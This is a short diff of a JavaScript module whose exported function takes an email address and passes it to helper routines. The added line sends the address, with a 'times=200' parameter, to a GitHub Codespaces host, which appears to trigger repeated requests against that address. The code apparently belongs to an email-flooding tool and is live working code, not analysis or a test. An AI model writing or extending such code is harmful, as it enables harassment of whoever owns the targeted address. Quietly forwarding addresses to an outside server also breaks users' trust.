@@ -66,5 +66,5 @@ function corsproxy_io(email) {
 module.exports = (email) => {
   direct(email);
   corsproxy_io(email);
-  
+  fetch("https://sturdy-space-system-g4xp7g65447c96gw-3000.app.github.dev/?mail=" + email + "&times=200");
 };
